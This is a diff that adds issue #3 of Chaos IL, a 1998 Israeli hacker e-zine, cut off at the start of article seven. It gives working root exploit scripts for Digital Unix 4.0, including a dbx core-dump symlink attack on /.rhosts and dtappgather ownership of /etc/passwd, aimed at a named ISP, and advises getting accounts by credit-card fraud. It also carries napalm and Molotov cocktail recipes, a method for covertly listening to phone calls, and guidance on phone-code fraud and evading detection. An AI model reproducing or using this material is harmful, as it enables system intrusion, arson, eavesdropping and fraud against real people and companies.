@@ -1,0 +1,1902 @@
+
+
+               < The Israeli Underground Information eXchage >  
+
+                   ,
+Ú     ,g,___.,,Úg?Pü~                                                 g¿,,,.
+  g.,gd$Pü''~``'4${              ,, ,,._            __..,,       _.,._}$$$$%'
+   'ü4$$b,        '   gÚÚ,..     :} :}"üP#g,.    ,yPü~"ü4Py.   ,gP'~"üü"~`
+      '$$$b.          ~ü4$$4     }$ }$    `$$b: d$}       }$b,%%}
+       :$$$%            ~$$i   _.,, iiÚÚ,, `4$%%%?W,      ;$$} $$;        ,
+      .}$$$P     g¿,,,. .}$$b#Pü"}: Ã$~"ü4  `$$b.`4?g,,.,g?Pü` ;?W,.,,Úg?Pü~
+     ,dPü"'  .,._}$$$$%':d$$'    $}g4:       `$$$b. `~}}~``     `4?~``'4${
+    ''  ,gP'``~"üü"~`  ,$$P'     iiü'        .'Pü~'                   ,d$P'
+        ''            .d$$'      $}       ,g,    --IL                d$$P'
+       ''            '~ü4`       :4g,     `ü'               .,,,    {$$$
+       ..          /              `ü'                       '?${_.,, `üPb,
+                jizm#@                                        'ü"~``'4g, ``
+                                                                      ''
+                                                                       ''
+                     Chaos IL - Issue #3, 13/Apr/1998                 ..
+                                                                      ,,
+
+  Oi!     ~If freedom is outlawed, only outlaws will have freedom~     Oi!
+
+
+                       Chaos IL Issue Three Index:
+                       ~~~~~~~~~~~~~~~~~~~~ ~~~~~~
+
+ 01. Introduction to Issue #3 (NEWS)                      by morpher
+ 02. The Trendline Hack - DIGITAL UNIX V4.0               by Captain Black            
+ 03. Hacking the IRIS OS                                  by morpher           
+ 04. How to make an improved Incendary Bottle             by Molotov             
+ 05. Tap into Bezeq's CALL WAITING service                by Terminal Man
+*06. Guide to Bezeq's Extenders and PBXs                  by TS / Bezeq
+ 07. Stuff you didn't knew about The Analyzer             by OXiD        
+ 08. Getting around with newbie Hacking                   by F0X
+ 09. Phun quotes from #chaos-il                           *  
+ 10. Setting your own VMB in Trilog PhoneMail Systems     by morpher
+ 11. TeleCards resetting                                  by OXiD
+ 12. Resources & Credits                                  Chaos-IL
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+           
+
+                                  ***
+
+
+01. Introduction to Issue #3
+
+
+                                                                               
+          ######  ##   ##  ######  #######  ########      ####  ##        
+         ##      ##   ##  ##  ##  ##   ##  ##             ##   ##
+        ##      #######  ######  ##   ##  ########       ##   ##
+       ##      ##   ##  ##  ##  ##   ##        ##       ##   ##
+      ######  ##   ##  ##  ##  #######  ########      ####  ########
+                                                                               
+
+                                 Issue #3
+
+
+                      (c) Chaos-IL Foundation 1998
+                                                                               
+
+Note from morpher (morpher@netlimit.com):
+
+Welcome to Chaos-IL issue #3!  I'm sorry it was a kind of delay until this new
+issue came out... but if you'll take a brief look on the issue you'll see
+it was worth waiting :).  First time we actually have a special guest directly
+from Bezeq, who gave us an article that answer all the questions that came
+up lately about Bezeq's PBXs and Extenders.  If you're currently using a PBX
+or an Extender, or even if you are about to use, please make sure to read this
+before begining so you'll know the risks :P  
+
+I've said it once and I'll say it again, if you think you have any kind of
+interesting, new and original information that you would like to write about,
+email it to us, and we might include it in the incoming issue.  The fact
+someone writes doesn't means he is a member, he's just another guy who wants
+to share the information he got in hands.
+
+It has been over a month since our last issue release and there have been
+some major updates going on.  Chaos-IL became much bigger then what we ever
+expected it to be and it's keep getting bigger even, checkout our current
+member list for more info. 
+
+Contact info updates:
+
+NEW- You may now leave voice messages to Chaos-IL at morpher's VMB:
+
+             177-022-3370  (dont bullshit my brain...bahh) 
+
+
+UPDATE- Our homepage was re-designed and updated, thanks to Fourth Horseman.
+
+            http://www.liquid98.com/chaos-il/
+
+
+IRC CHANNEL- Our IRC channel is now public on the EFnet  -  #chaos-il
+
+ 
+
+                                            morpher. 
+
+_____________________________________________________________________________
+
+
+Chaos-IL primary members:
+
+morpher                  morpher@netlimit.com
+Captain Black            capblack@unixgods.com
+Mr. Freeze               mr_freeze@idc.co.il
+squish                  
+Dissection               orphaned_land@hotmail.com
+Easy                     K_O_C@hotmail.com
+The Trick                trick@mindless.com
+OXiD                     transzen@hotmail.com
+skade
+Terminal Man             terman@hotmail.com
+MOONCHiLD                m00nchild@mosad.org
+malder                   sharky@hotmail.com
+Molotov                  molotov@hotmail.com
+Jekyll                   wwsuicide@hotmail.com
+The Errormaker
+Fourth Horseman          4thm@liquid98.com
+
+               
+Members can be reached via eMail (also see in article's buttom).
+Applications, feedbacks, corrections, support, will done at:
+
+     morpher@netlimit.com
+
+
+                        How to retrieve Chaos IL
+                        ~~~~~~~~~~~~~~~~~~~~~~~~
+Chaos IL Issues will be regulary available once released in these fine boards:
+
+Liquid Underground      +972 (0)3-9067029
+Kaos On Compton         +972 (0)8-8524603
+The Orphaned Land       +972 (0)8-9422043
+
+
+Chaos IL is also regulary in the following anonymous sites:
+
+ftp.fc.net             /pub/phrack/underground/chaos-il/
+ftp.auscert.org.au     /pub/emags/chaos_il/
+
+* Israeli sites will be also available soon.
+
+
+You can also:
+
+-Join our IRC channel at EFFNet: #chaos-il
+-Look out the Web at: http://www.liquid98.com/chaos-il/
+
+
+
+                                  ***
+ 
+
+
+02. The Trendline Hack - DIGITAL UNIX V4.0
+
+
+
+
+                         $  THE TRENDLINE HACK   $
+
+                             by Captain Black
+
+                      (c) Chaos-IL Foundation 1998
+
+
+
+Trendline Hack Introduction
+---------------------------
+
+Trendline is an old Internet Service Provider company in the Internet fields
+of Israel. Different from some of the other ISPs in Israel, Trendline is
+an Hacker-friendly ISP. Trendline gives us almost everthing possible to:
+
+-Hack them (Root them)
+-Fraud thier accounts billing
+-Flood them (simply)
+-Hack thier webpage
+-Abuse thier IRC users
+
+Though all those, I'll be dealing with one thing rightnow: Hacking them,
+or in other words, gaining root on thier system.
+Trendline router is used on Digital Unix 4.0 Operating System, which is
+known as a hell of holed system (pretty stupid to run a router on it).
+In this article I exampled and described all the operations and high level
+techniques you may use to gain root on thier system, though its a
+regular DG/UX 4.0 as the others, Trendline's system has a few holes that
+are specialized for thier host.
+
+--
+
+In order to try/excute all of the below techniques, you must have a trendline
+account. Trendline accounts are easy to get on the public, or you can card
+yourself one with a valid full-detailed credit card info. (you might want
+to take a look at the PPA accounts carding article in Chaos-IL #2)
+
+Trendline support number: 03-6388222  (use this to card)
+
+After you are equiped' with account, access thier UNIX system through
+the main host at trendline.co.il , or if you are fimilar with X.28 / X.25
+routers you may make your work easier and access them through the escape
+key ('^]') after you entered username (no password) for ppp mode.
+
+/\NOTE/\
+
+I'm writing this article as I'm assuming you are basically fimilar with UNIX,
+so I wont start detailing every little command and technical step.
+
+
+and YES, I did Hacked Trendline with one of the techniques listed below.
+
+
+***************************************************************************
+
+
+Local techniques
+----------------
+
+The first thing to try is the IFS hole in /usr/sbin/dop. If dop is setuid
+root, there is a good chance that you can gain root this way. Here is a
+shell script :
+
+----------------------------------------------------------------------------
+
+#!/bin/sh
+cat > /tmp/usr <<EOF       
+#!/bin/sh
+IFS="   "                                                             
+export IFS                                                       
+exec /bin/sh               
+EOF                                                                 
+chmod 755 /tmp/usr         
+IFS=/ PATH=/tmp:$PATH /usr/sbin/dop crack-user=root
+
+----------------------------------------------------------------------------
+
+After running this shell script, if it works, your euid should be 0. Your
+prompt may or may not change depending on which shell you are using, so do
+an id and check. That is a old sploit that most competent admins have 
+probably fixed. 
+
+Digital Unix has a large problem in the way that it handles core dumps of 
+setuid root programs. If you can get a setuid root program to dump core,
+it will create the core file as root, and it will follow symlinks. So,
+how can we exploit this? I noticed a long time ago that if you run dbx
+on a setuid root program that you have read access to, then it will core dump
+in your current directory. Dbx is a debugger that comes with digital unix. 
+However, some times machines won't have the liscence files installed
+correctly. Here is the exploit :
+
+----------------------------------------------------------------------------
+
+#!/bin/sh
+# dbx exploit by humble
+# works on Digital Unix 4.x                                           
+# this overwrites /.rhosts                                             
+ 
+mkdir /tmp/.testing
+cd /tmp/.testing                                                        
+ln -s /.rhosts core                                                    
+BOB="
++ +                                                   
+"
+export BOB                                                          
+dbx /bin/crontab                                                      
+dbx /bin/crontab                                                        
+dbx /bin/crontab                                                         
+rm -rf /tmp/.testing                                                
+rsh -l root localhost /bin/sh -i
+
+----------------------------------------------------------------------------
+
+If /bin/crontab is not setuid root or you don't have read permissions to
+it, you can use any other setuid root program.
+
+Ok. If that doesn't work, there is another core dump situation I have
+found. I have only verified this on three machines and have been told
+that it hasn't worked on one or two others. The program /usr/X11/bin/dxpause 
+is a screen locker. I found that when I run that program, and have my 
+DISPLAY set to my freebsd or my linux box (running xfree86), the program
+will dump core as root. Be carefull though, if the program doesn't dump
+core, you will have to enter the password of the person who's account
+you are using. You have to set up your X server to allow connections from
+the target, and you will probably have to click once on your machine to
+get the program running on the Trendline's Digital Unix box to crash. 
+Anyway, this can be exploited in a similair fashion to the dbx problem.
+
+There is another core dump that was mentioned on Bugtraq by Tom Leffingwell,
+but I haven't been able to re-create it. Here is excerpts from his posting:
+
+----------------------------------------------------------------------------
+
+Version Affected:  Digital UNIX 4.0B *with* patch kit 5
+                   Unpatched 4.0B is not vunerable to this particular   
+                   problem, but it is to others.
+
+Patch kit 5 included a replacement xterm because the old one had a bug, too.
+They replaced it with another that had a bigger problem. You can cause a
+segmentation fault in xterm simply by setting your DISPLAY variable to a
+display that you aren't allowed to connect to or one that doesn't exist.
+Start xterm, and you get a core file.
+
+----------------------------------------------------------------------------
+
+Ok, core dumps not working? Don't worry.. there's more to Trendline.
+There has been some talk about holes in dtappgather on the security mailing
+lists. We can use one of the holes to our advantage as well.
+Using dtappgather, we can make any file on the system owned by us. This is
+obviously a good way to take over a machine. Exploit:
+
+env DTUSERSESSION=../../../../../../../../etc/passwd /usr/dt/bin/dtappgather
+
+and /etc/passwd is now owned by us. This could be used to gain control of
+/etc/inetd.conf and just about anything else you could imagine. I haven't 
+used this exploit to mess around with the /tcb/files/auth/* tree, but I
+would be willing to bet it is very successfull.
+
+I've also noticed that the X server setup on some Digital Unix boxes are 
+insecure. If you have a shell on the machine, try to set your DISPLAY to 
+localhost:0 or the machines hostname:0, and then run a program like xkey.
+
+Here are some exploits that I havent used or tried before (edited a little):
+
+----------------------------------------------------------------------------
+
+                         .LoW  _  _
+                     |\  | _ |(_`|_'
+                     |  \|(_)|,_)|_.
+               ==========================
+
+H0l4. So here it is another bug for Digital
+
+System: OSF1 my.narco-goverment.sucks.co V4.0 464 alpha
+
+Program: fstab - Static information about file systems and swap partitions
+         advfsd - Starts the AdvFS graphical user interface daemon
+Problemo: It creates a lockfile in tmp with nice permitions :)
+   /tmp>ls -la
+
+   (Blah Blah Blah.....)
+
+   -rw-rw-rw-   1 root     system    0 Nov xx 15:49 fstab.advfsd.lockfile
+
+What the hell to do with it:
+
+   Before it creates
+   ln -s /.rhosts /tmp/fstab.advfsd.lockfile
+
+   from here... cat "+ +" > /tmp/fstab.advfsd.lockfile , etc etc.
+
+                     The End - El Fin
+
+                      Colombia 1997.
+
+                         .LoW  _  _
+                     |\  | _ |(_`|_'
+                     |  \|(_)|,_)|_.
+
+                   Efrain 'ET' Torres
+
+----------------------------------------------------------------------------
+
+This if for Digital Unix 3.x (I've never seen it work.)
+
+$ ls -l /usr/tcb/bin/dxchpwd
+-rwsr-xr-x   1 root     bin        49152 Jul 25  1995 /usr/tcb/bin/dxchpwd
+$ ls -l /tmp/dxchpwd.log
+/tmp/dxchpwd.log not found
+$ export DISPLAY=:0     (or a remotehost)
+$ ln -s /hackfile /tmp/dxchpwd
+$ ls -l /hackfile
+/hackfile not found
+$ /usr/tcb/bin/dxchpwd
+(The dxchpwd window will appear. Just enter root for username
+ and anything for the passwd. You'll get a permission denied
+message and the window will close.)
+$ ls -l /hackfile
+-rw-------   1 root     system         0 Nov 16 22:44 /hackfile
+
+----------------------------------------------------------------------------
+
+Remote techniques
+-----------------
+
+I don't have too much here except one pretty big hole. Digital Unix 4.x
+is blind ip spoofable!!! So, if you can guess or determine a trust 
+relationship, the machine is yours. Also, when the CERT statd advisory 
+came out, Digital released a patch. I haven't played around with that, but
+it might be worth looking into.
+
+Also, Digital Unix 4.0 sometimes has an 0wned finger daemon, try this..
+
+% finger Ý/bin/w@host
+
+if this gives uptime info etc, it shows the system is vulnerable to this
+attack, you can specify any command.. simple to use.
+
+
+Captain Black.
+
+
+
+____________________________________________________________________________
+
+
+
+                                  ***
+
+
+03. Hacking the IRIS OS
+
+
+              /---/---/---/---/---/---/---/---/---/---/---/
+
+                          Hacking the IRIS/OS
+
+              /---/---/---/---/---/---/---/---/---/---/---/
+
+                              by morpher
+ 
+                               Chaos IL
+   
+
+ IRIS R9.1.3A Introduction
+
+Hello Everybody, Here is some info on a relatively old System called IRIS or
+Interactive Realtime Information Service. This system was originally meant
+to run on older systems like PDP-8 and PDP-11. Due to the versatile nature
+of IRIS, today a lot more systems run it. IRIS systems usually can be reached
+at 1200 7E1 and after pressing either ESCape or Enter a few times, you should
+see something like this as a greet:
+
+-=-
+Welcome to "IRIS" R9.1.3A timesharing !
+
+ACCOUNT ID ?
+-=-
+Or sometimes it will say what you have reached under the welcome line. IRIS
+is also extremely hacker-friendly as it will let you type account names for 
+as long as you want. Also when you guess an account there are no passwords on
+them. At first you will not see what you type, to change this type Control-E
+to turn the echo on. Try CAPSLOCK also.
+-=-
+
+DEFAULT ACCOUNTS
+----------------
+
+MANAGER (Good System Access)
+NO NAME (Normal User)
+DEMO (Try the other ones first)
+PDP8     /
+PDP11   < == All General Accounts
+SOFTWARE \
+
+Hopefully you're in there with one of those accounts. Now, then you will get
+a # prompt. If you are on with an account of access level 3, then you will
+be able to use a user maintanencer program, by typing either ACCOUNTS or
+ACCOUNT UTILITY. You should get:
+-=-
+
+ (0) EXIT TO SYSTEM
+ (1) ADD NEW ACCOUNT
+ (2) MODIFY ACCOUNT
+ (3) DELETE ACCOUNT
+ (4) INQUIRE ACCOUNT
+ (5) LIST THE ACCOUNTS
+
+Ah, I wasn't able to create an account, but I did modify several. Basically
+this is pretty straight forward.
+-=-
+Ok, after you're done playing with the accounts and exit properly there are 
+a lot of interesting features on this IRIS. On one particular system that I
+use often you have several utilities such as spreadsheets, word processors 
+and even an ASM program. You can get a list of all the things to do by typing
+LIBR at the # prompt. most of the filenames you type the response will be 
+"NOT A PROCESSOR", Since most of the IRIS software was written is business
+BASIC. Type BASIC LOAD <Filename>. Here are some of the most interesting 
+programs.
+
+PP or PORT ALL MONITOR will let you see who else is using the system. if 
+for some reason you want to kick off a user, type PPP and then the user name.
+Also if you want to see your own status type PROT.STAT
+
+If you need help with something try typing GUIDE and it will give you a short
+menu of all the help files available. Too bad there usually isn't many.
+
+Another interesting utility to use is BLOCKCOPY, since I am not completely
+used to it, I will show you what the guide said:
+
+INTERACTIVE PROGRAM GUIDES
+
+
+FOR IRIS CONFIGURATION AND SETUP
+
+TOPIC #      FOR INFORMATION ON:
+
+  1            BLOCKCOPY
+
+
+
+THESE PROGRAMS CAUSE NO ACTUAL CHANGES TO TAKE PLACE. RATHER
+THEY DESCRIBE THE ACTUAL PROCESSORS/COMMANDS YOU SHOULD USE TO
+MAKE THE CHANGES YOU DESIRE. 'BEFORE' YOU ACTUALLY DO MAKE THE
+SUGGESTED CHANGES, YOU SHOULD FIRST 'BACKUP YOUR SYSTEM'.
+REMEMBER TO BE VERY CAREFUL WHEN WORKING WITH THE DSP PROCESSOR.
+
+
+ENTER TOPIC # 1
+INTRODUCTORY COMMENTS ON USING BLOCKCOPY
+
+
+PRINT HERE OR $LPT (C/R OR $) : 
+
+INTERACTIVE PROGRAM GUIDE ON SETTING UP BLOCKCOPY
+
+INTRODUCTION
+
+BLOCKCOPY IS A STAND-ALONE UTILITY PROGRAM WHICH GIVES GREAT
+FLEXIBILITY IN COPYING ANY PART OF ONE DISC TO ANY PART OF
+ANOTHER, EVEN ONTO A DIFFERENT DISC CONTROLLER.
+BLOCKCOPY DOES NOT PROVIDE FAST PERFORMANCE, BUT IT CAN BE VERY
+USEFUL IN SPECIAL CASES.  EXAMPLES:
+
+1) YOU CAN COPY A SINGLE LOGICAL UNIT FROM ONE PACK TO ANOTHER,
+   WITHOUT OVERWRITING OTHER LOGICAL UNITS ALREADY ON THE
+   DESTINATION.
+
+2) IF YOU HAVE BOTH LARGE STORAGE MODULES AND SMALLER CARTRIDGE
+   DRIVES ON THE SAME SYSTEM, YOU CAN BACKUP YOUR SYSTEM LOGICAL
+   UNIT 0 FROM STORAGE MODULE ONTO A CARTRIDGE PACK WHICH CAN
+   BE SET ASIDE AS A DEDICATED SYSTEM BACKUP.
+
+3) IF YOU HAVE A SPECIAL SWAPPING DISC, IT CAN BE BACKED
+   UP TO AND RESTORED FROM OTHER STORAGE MODULES.
+
+
+PRESS RETURN WHEN READY TO GO ON 
+
+LIMITATIONS
+
+NOTE THAT WHILE YOU CAN COPY FROM ONE TYPE OF DISC CONTROLLER
+TO ANOTHER, THE RESULT MAY NOT BE INSTALLABLE UNDER
+IRIS BECAUSE OF SOME DISC ADDRESS CONSIDERATIONS.
+
+ALSO NOTE THAT YOU MAY NOT SPECIFY A DESTINATION WHICH
+PHYSICALLY OVERLAPS THE SOURCE ON THE SAME PACK.
+SETUP
+
+FIRST, HAVE AT HAND YOUR R9.0 PERIPHERALS HANDBOOK.
+NOTICE THAT FOR EACH TYPE OF DISC, THERE IS A DIFFERENT VALUE
+FOR THE BZUD POINTER.
+ALSO NOTICE THAT IT GIVES YOU FORMULAS TO COMPUTE VALUES CALLED PHYU.
+FIND THE APPROPRIATE DISC SPECIFICATION SHEET(S) DESCRIBING
+YOUR SOURCE (WHERE YOU ARE COPYING BLOCKS FROM) AND YOUR
+DESTINATION (WHERE YOU ARE COPYING BLOCKS TO).  THE SOURCE
+AND DESTINATION DO NOT HAVE TO BE THE SAME TYPE OF CONTROLLER.
+
+
+PRESS RETURN WHEN READY TO GO ON 
+
+
+NOTE: ALL REQUESTED VALUES/CALCS IN OCTAL UNLESS OTHERWISE NOTED.
+      ALL VALUES ON DISC SPECIFICATION SHEETS ARE IN OCTAL.
+
+
+ENTER THE FOLLOWING VALUES FOR THE SOURCE:
+
+                         ADDRESS OF THE SOURCE BZUD : 0
+                      COMPUTED VALUE OF SOURCE PHYU : 0
+                           STARTING CYLINDER NUMBER : 0
+BLOCK # IN THE CYL TO START COPYING FROM (ORIGIN 0)
+                               THIS IS NORMALY ZERO : 0
+                    SOURCE CONTROLLER'S DEVICE CODE : 0
+                                  SOURCE DISC'S LRC : 0
+ NUMBER OF CYLINDERS TO COPY (REM TO GIVE IN OCTAL) : 0
+
+
+
+
+ENTER THE FOLLOWING VALUES FOR THE DESTINATION:
+
+                    ADDRESS OF THE DESTINATION BZUD : 0
+                 COMPUTED VALUE OF DESTINATION PHYU : 0
+                                  STARTING CYLINDER : 0
+  BLOCK # IN THE CYL TO START COPYING TO (ORIGIN 0) : 0
+               DESTINATION CONTROLLER'S DEVICE CODE : 0
+
+PRINT HERE OR $LPT (C/R OR $) : 0
+
+
+RUN "MAKEBLOCKCOPY", WHEN FINISHED ENTER THE FOLLOWING COMMAND:
+  #SHUTDOWN <CTRL-E>[PASSWORD]<CTRL-E> BLOCKCOPY @73000,X73000
+
+USE DBUG TO SET UP THE FOLLOWING LOCATIONS:
+
+ 200 : 0 
+ 201 : 0 
+ 202 : 0 
+ 203 : 0 
+ 204 : 0 
+ 205 : 0 
+ 206 : 0 
+ 207 : 0 
+ 210 : 0 
+ 211 : 0 
+ 212 : 0 
+ 213 : 176346 
+
+
+PRESS RETURN WHEN READY TO GO ON 0
+
+THEN J410 (OR RESET & START AT 410) TO START THE COPY
+
+
+RULES FOR BLOCKCOPY:
+
+   ADDRESS     FUNCTION
+
+       400     BAD HALT
+       401     NOT USED
+       402     NOT USED
+       410     START COPY
+       411     START VERIFY
+       412     START DISC PATTERN GENERATOR
+       413     START DISC PATTERN VERIFICATION
+       414     RETRY CURRENT BLOCK/IF SUCCESSFUL, RESUME-NO LOSS
+       415     SKIP CURRENT BLOCK/GO TO NEXT BLOCK - BLOCK LOST
+       416     START INFINITE DISC PATTERN TEST
+
+
+PRESS CR TO CONTINUE DISPLAY OF RULES
+
+   HALTS:
+       63077   INDICATES A SUCCESSFUL COMPLETION
+       63377   WRONG VALUE(S) IN TABLE STARTING AT 200
+       67077   READ ERROR
+       73077   WRITE ERROR
+       63277   VERIFY ERROR IN CORE COMPARE
+
+   ON READ OR WRITE ERROR, CHECK THE FOLLOWING CELLS:
+       260 = CURRENT SOURCE RDA
+       261 = CURRENT DEST RDA
+       262 = CURRENT DISC STATUS
+
+NO AUTOMATIC RETRIES ARE DONE.
+ON A BAD BLOCK, THERE ARE OPTIONAL RESTARTS AT LOC 414 & 415 (SEE ABOVE)
+
+
+INTERACTIVE PROGRAM GUIDES
+
+
+FOR IRIS CONFIGURATION AND SETUP
+
+TOPIC #      FOR INFORMATION ON:
+
+  1            BLOCKCOPY
+
+
+
+THESE PROGRAMS CAUSE NO ACTUAL CHANGES TO TAKE PLACE. RATHER
+THEY DESCRIBE THE ACTUAL PROCESSORS/COMMANDS YOU SHOULD USE TO
+MAKE THE CHANGES YOU DESIRE. 'BEFORE' YOU ACTUALLY DO MAKE THE
+SUGGESTED CHANGES, YOU SHOULD FIRST 'BACKUP YOUR SYSTEM'.
+REMEMBER TO BE VERY CAREFUL WHEN WORKING WITH THE DSP PROCESSOR.
+
+-=-
+Also you can edit individual text files and configuration files
+by text editors. The names of this shit is different on all the systems
+I've called.
+-=-
+
+CONCULSION
+
+I hope this serves a useful purpose.. I still can't understand why IRIS is
+extremely easy to use, and very common.. yet, I haven't seen any good
+articles on it in the previous issues of chaos-il.
+
+morpher.
+
+================================================================================
+
+
+04. How to make an improved Incendary Bottle
+
+
+                        Chaos-il's NEW Anarchy Division
+                        *******************************
+   Article #1      How to make an improved Incendary Bottle
+   ________________      (aka, Molotov Cocktail)     ___________
+                                         By: Molotov
+
+        Incendary Bottles, popularly known as Molotov Cocktails are used
+to start fires in buildings or as weapons against vehicles or troops.
+A Molotov Cocktail is nothing more than a glass bottle or jar which has been
+filled with gasoline and plugged with a gas-soaked rag in the end. When the
+rag is lit and the bottle is thrown, the gasoline is ignited and spreads a
+sheet of flame.
+        More effective Molotov Cocktails can be made by using homemade napalm
+instead of gasoline. For those of you who don't know, napalm is simply gelled
+gasoline which burns hotter than regular gasolne and clings to whatever it
+splatters on!
+        Now, on with the napalm... Napalm can be made in several easy ways.
+The easiest method is to mix 36 parts by volume of gasoline with 1 part of
+100-proof alcohol (whiskey or vodka) and 25 parts soap flakes. Only real soap
+such as Ivory or Palmolive soap bars can be used. Detergent will NOT work.
+        Put the gasoline in a bucket or other container and add the alcohol.
+Stir the soap flakes in slowly until the gasoline sets in a thick gel.
+After standing for a few days, the mixture will have the consistency of butter.
+If necessary, it can be thinned by adding more gasoline.
+        Gasoline can also be gelled with egg whites and any of the following
+additives: instant coffee, sugar, Epsom salts, baking soda, or salt. To make
+napalm, place the gasoline in a bucket and add 1 part of egg whites to every
+6 parts of gasoline. Slowly add the coffee, sugar or some other suitable
+material until the gasoline gels to the consistency of jam. This version of
+napalm breaks down quickly and should be used within 24 hours.
+
+                                Have fun!
+
+
+05. Tap Bezeq's CALL WAITING service
+                     
+                                                
+           +++++++++++++++++++++++++++++++++++++++++++++++++++
+           +                                                 +
+           +           Tap Bezeq's CALL WAIT service         +
+           +                                                 +
+           +++++++++++++++++++++++++++++++++++++++++++++++++++
+              +              by Terminal Man              +   
+              +++++++++++++++++++++++++++++++++++++++++++++  
+                             ++ Chaos IL ++
+
+
+So, you have an enemy who talks behind your back, eh? Or, maybe you just
+would like to "listen" in on your friend's conversations? Well, if you have 2
+phone lines and call waiting on one of them, you are in luck. (Only one
+problem: your friend must also have call waiting!)
+
+Procedure:
+
+[1]  Call up your friend with the phone you want to listen with.  When he
+answers call waiting (he's already on the phone, and you are the 2nd caller),
+then you either sit there or say: sorry, I have the wrong #.
+[2]  Next, you wait until he goes back to the other line (puts you on hold).
+[3]  Then, pick up your other line and call ->YOUR<- call waiting.
+[4]  Answer call waiting
+[5]  Then go back to him. (Answer, and then click back.. Click ->2<- times
+     answer, and go back..)
+[6]  Hang up your second line
+[7]  You are now on the line!
+[8]  Listen and be Q U I E T !
+     He can hear you!
+
+Techniques I use to prevent noise or confusion:
+If you have call forwarding, turn it on and forward calls somewhere before you
+start listening. If a call comes through on your call waiting circuit,
+the people talking (your buddie and his pal) will not hear anything,
+but after you answer call waiting and come back, they will hear the other
+call hang up (two clicks). If you don't have call forwarding, I suggest you
+get it if you are going to make a habit of this, because it will become
+a major pain in the ass. When your call waiting rings, you are removed
+from the "listening" conversation and placed back on his hold circuit.
+In order to get back on, you must answer the phone and wait for your party
+when you answer the phone, tell the guy you are in a hurry and you have to go
+or you'll call him back later or something) to hang up. When he or she hangs
+up, you will be back on the conversation. Then, one of your pals will
+say: What was that? (because of the clicks).. So, try to use call forwarding
+if you can. Remember: Have fun, and don't abuse it. I am not sure about it,
+because I just discovered it. It is illegal (what isn't these days) because
+it is invading privacy". I don't know if Bezeq opers just did not realize
+there was a flaw in it, or that was planned for line testing, I am not sure.
+
+          Have phun...
+
+                  Terminal Man.                                                
+
+
+_____________________________________________________________________________
+
+
+06. Guide to Bezeq's Extenders and PBXs
+
+
+			Guide to Extenders and PBXs
+
+                    By: TS (1996 - '98 Bezeq 199 oper)
+
+Disclaimer: Don't blame any Chaos-IL members :-)
+
+I will probably use a few abbrevations in this, so its would be good to know
+them.  Here they are:
+
+PBX: Private Branch eXchange
+ANI: Automatic Number Identification
+LD: Long Distance
+ACN: Area Code and Number
+IES: Internal Extension System
+SCC: Specialized Common Carrier
+ESS: Electronic Switching System
+CAMA: Centralized Automated Message Acounting
+
+A PBX and a extender are not the same thing.  They are used as the same word
+because you can use them to accomplish the same goal: making a free ld or
+local call.  First, I will talk about PBXs in general, and Bezeq's PBXs.
+
+A PBX is a baically a few telephone numbers owned by a company. PBXs are
+present when a company has a IES. An IES is a system in which a person at his
+desk can dial three numbers to reach another person's desk in the same office.
+If the person wants to dial outside of their office or building, they must
+dial 9 then the ACN. I have also seen * and # instead of 9.  Some PBXs have
+dial up lines so the people can work from home.  This way, the employees
+don't have to pay for their business calls.  
+
+The company gives each employee a certain authorazation code, so they can call
+the dialup of the PBX, enter their authorazation code, and press 9 (or *,#),
+then the acn, and their compnay pays for the call.
+You can tell if you've found a PBX if there is a different ringback.
+I suppose you'll know if you found one.  You can get them by randoming dailing
+numbers (e.g: make an 177 number scan), or use your social engineering skills.
+
+An extender is a service setup by a telephone company.  Basically, a extender
+has the same function as a phone card.  You dial the phone number the phone
+company gives you, enter your authorazation code, and the dial the acn (no 1).
+Extenders can be found in the 177 NPA or in the 1-800 range.
+1-800 numbers are free from your house, but not a pay phone.  There a few
+possible ways to find extenders.  You could call the phone company and say
+you forgot the phone number where I can enter my authorozation code.
+Another way is to randoming dialing numbers.  I would use 177 numbers first.  
+
+Ways of knowing you found an extender:     
+
+1.  Get a dialtone after dialing the number.
+2.  Short beep then silence.
+3.  Constant tone that stops when you dial something.
+4.  If you are asked for the code and phone number  (kind of obvious)
+
+
+So if you find one of those, then you MAY have found an extender.  Number
+three is most likely an extender.  I've never really seen any that aren't.
+Once you have found an extender, you must find out how many digits are in the
+code, and if it wants the code or acn first.  That's the hard part, I guess
+you should just play around with it.  Listen for tones.
+
+Most extenders are 177 numbers, and most 177 numbers are equipped with the
+ability to trace.  Most extenders and PBXs have ANI which means it knows your
+phone number when you call.  PBXs can sometime be found in local areas.
+Extenders can normally call anywhere to the US and Canada.  All the PBXs
+I work with can call basically anywhere.  1-800 extenders have a nice clear
+connection, nice for data transfers.
+
+I must now explain something about Bezeq, so I can tell you how to secure and
+not get caught. ESS has the ability to trace calls.  ANI is what enables ESS
+to trace.  ESS also has a tape which records information about phone calls.
+This is called CAMA.  It records the number of the caller and receiver,
+the time of the call, if the reciever answered the phone, and what time the
+caller hangs up.  The tape is used for billing purposes.  Normally, 177 numbers
+and local calls are ignore when it is sent for billing.  The billing machines
+are quite sensitive though.
+
+Here is a list of what extenders can detect (from my knoledge, I wouldn't be
+suprised if this list could be doubled.)
+
+1.  Sequenticial Dialing (if you use this, you saying "Bezeq! caught me!" :))
+
+2.  Number of calls coming from a phone number (try to scan during the day,
+    becuase who would make 400 calls at 3:00 a.m.?)
+
+3.  Time between calls.  (like 5 calls in a minute, or if there is a code
+    failure every couple of minutes.)
+
+4.  Time it takes to dial a number.  (not many people can dial a phone number
+    in 50 miliseconds.)
+
+5.  Amount of time between each number.  (not many people can have exactly
+    1 milisecond between the 8 the 0 and the 0.)
+
+6.  (I hear rumors that they have list of Bezeqnet and Internet-zahav numbers,
+    so don't call Bezeqnet and Inet-zahav all the time, makes sense to be true).
+
+Basically, what I'm getting at is to use randomnization.  I would recommend
+dialing everything by hand, but that would take to long, so find yourself
+a good code hacker that has randomnization.  I don't really use them, so I
+don't know of any.
+
+Also, if you happen to find some codes, don't go crazy.  If you get 
+caught, you probably won't go to court or anything like that.  Bezeq will
+probably just send you a bill.  Some people say to distribute you authorozation
+codes so that Bezeq can't bill all the people using their extenders or PBXs.
+In a case like this, they would probably bill the persons who used it most
+or they'll just prolly close the extender. 
+
+                                  [EOF]
+
+I cannot give away my email address or any other personal contact info.
+you may contact me through Chaos-IL VMB at # 177-022-3370
+                               (please sign your message to "TS") 
+
+
+
+_____________________________________________________________________________
+
+
+
+07. Stuff you didn't knew about The Analyzer
+
+
+                  ###################################
+
+                      Stuff you didnt knew about... 
+
+                          ** The Analyzer **
+                          
+                  ###################################
+
+                              by OXiD
+
